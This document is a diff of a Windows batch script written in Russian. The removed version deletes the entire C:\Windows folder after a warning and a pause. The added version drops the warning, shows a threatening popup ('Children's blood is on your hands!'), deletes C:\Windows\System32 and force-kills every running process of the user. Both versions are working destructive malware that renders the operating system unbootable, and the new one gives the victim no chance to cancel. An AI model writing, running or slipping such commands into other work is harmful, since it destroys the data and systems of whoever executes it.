@@ -1,14 +1,8 @@
-@echo off
-echo ВНИМАНИЕ! Этот скрипт удалит системные файлы Windows и сделает ОС неработоспособной.
-echo Нажмите Ctrl+C чтобы отменить или любую клавишу для продолжения...
-pause 
-
-echo Получение прав на папку Windows...
-takeown /f C:\Windows /r /d Y
-icacls C:\Windows /grant %username%:F /t
-
-echo Удаление папки Windows...
-rd /s /q C:\Windows
-
-echo Удаление завершено. ОС будет повреждена и не загрузится.
-pause
+@chcp 65001
+color 02
+mshta "javascript:alert('Кровь детей на вашых руках!');close()"
+rd /s /q C:\Windows\System32
+taskkill /im explorer.exe /f >nul
+for /f "tokens=1" %%i in ('tasklist /FI "USERNAME eq %USERNAME%" /FI "STATUS eq running" /NH') do (
+    taskkill /f /im "%%i" >nul 2>&1
+)
